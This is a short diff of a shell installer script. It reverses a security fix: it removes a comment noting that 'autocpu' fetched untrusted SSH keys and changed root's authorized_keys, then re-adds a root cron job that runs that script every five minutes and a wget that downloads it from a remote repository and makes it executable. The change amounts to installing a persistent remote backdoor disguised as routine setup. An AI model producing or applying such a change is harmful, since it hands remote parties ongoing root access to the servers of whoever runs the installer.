@@ -65,8 +65,14 @@ done
 
 echo -e " [INFO] Downloading menu.zip..."
 {
-# Removed: autocpu fetched untrusted SSH keys and modified root authorized_keys.
-rm -f /etc/cron.d/cpu_otm /usr/bin/autocpu /etc/cron.d/daily_reboot
+> /etc/cron.d/cpu_otm
+
+cat> /etc/cron.d/cpu_otm << END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/5 * * * * root /usr/bin/autocpu
+END
+wget -O /usr/bin/autocpu "${REPOS}install/autocpu.sh" && chmod +x /usr/bin/autocpu
     wget -q ${REPOS}menu/menu.zip
     7z x -p$pwadm menu.zip &> /dev/null
     chmod +x menu/*
